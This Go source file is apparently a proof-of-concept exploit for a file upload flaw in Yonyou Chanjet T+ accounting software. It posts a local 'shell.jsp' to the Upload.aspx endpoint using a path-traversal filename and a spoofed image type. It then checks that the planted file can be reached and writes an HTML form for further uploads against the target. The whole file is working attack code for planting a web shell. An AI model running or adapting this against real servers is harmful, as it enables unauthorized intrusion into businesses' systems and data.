package poc

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"os"
	"regexp"
	"strings"
)

func TPlusUpload(target string) {
	// 创建一个带有文件的请求体
	url := strings.TrimRight(target, "/")
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	file, _ := os.Open("shell.jsp")
	defer file.Close()

	part := make(textproto.MIMEHeader)
	part.Set("Content-Disposition", `form-data; name="File1"; filename="../../../Xsage.txt"`)
	part.Set("Content-Type", "image/jpeg")
	filePart, _ := writer.CreatePart(part)
	io.Copy(filePart, file)

	writer.Close()

	// 创建请求
	req, _ := http.NewRequest("POST", url+"/tplus/SM/SetupAccount/Upload.aspx?preload=1", body)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("请求发送失败:", err)
	}
	defer resp.Body.Close()

	reqshell, _ := http.NewRequest("GET", url+"/tplus/Xsage.txt", nil)
	respshell, err := client.Do(reqshell)
	if err != nil {
		fmt.Println("请求发送失败:", err)
	}
	defer respshell.Body.Close()
	if err != nil {
		fmt.Println("请求发送失败:", err)
	}
	respbody, _ := io.ReadAll(resp.Body)
	msg := regexp.MustCompile("出错页").MatchString(string(respbody))
	if resp.StatusCode == http.StatusOK && !msg && respshell.StatusCode == http.StatusOK {
		log.Println("[+] 存在用友畅捷通T+文件上传漏洞：" + url + "/tplus/Xsage.txt")
		log.Println("[+] 生成上传页面文件，详细使用方式请看 README.md")
		content := "<form action=\"" + url + "/tplus/SM/SetupAccount/Upload.aspx?preload=1\" name=\"form1\" id=\"form1\" method=\"post\" enctype=\"multipart/form-data\">  \n    <input name=\"File1\" type=\"file\" id=\"File1\"> <br> \n    <input type=\"submit\" value=\"上 传\"> \n</form>"
		err := os.WriteFile("Uploadfile.html", []byte(content), 0644)
		if err != nil {
			log.Fatal(err)
		}
	} else {
		log.Println("[-] 不存在用友畅捷通T+文件上传漏洞")
	}

}
